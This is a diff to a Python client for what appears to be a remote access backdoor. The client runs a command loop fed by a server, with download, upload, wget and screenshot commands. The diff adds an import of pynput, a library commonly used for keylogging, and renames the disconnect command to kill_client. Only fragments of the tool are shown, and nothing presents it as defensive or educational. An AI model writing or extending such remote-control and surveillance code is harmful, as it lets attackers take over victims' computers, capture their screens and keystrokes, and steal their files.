@@ -9,7 +9,7 @@ import sys
 import time
 import requests
 from mss import mss
-
+import pynput
 
 def send_j(data):
     json_data = json.dumps(data)
@@ -60,7 +60,7 @@ def shell():
     while True:
         cmd = recv_j() # receive command from server
 
-        if cmd == "exit_client":
+        if cmd == "kill_client":
             break
 
         elif cmd == "help":
@@ -70,8 +70,7 @@ download <file> : Download file from host
 Upload <file>   : Upload file to host
 wget <URL>      : Download file from a URL 
 screenshot      : Take a screenshot
-exit_client     : Disconnect current host 
-exit_server     : Disconnect server
+kill_client     : Disconnect current host 
                         '''
             send_j(help_opt)
         elif cmd[:2] == "cd" and len(cmd) > 2:
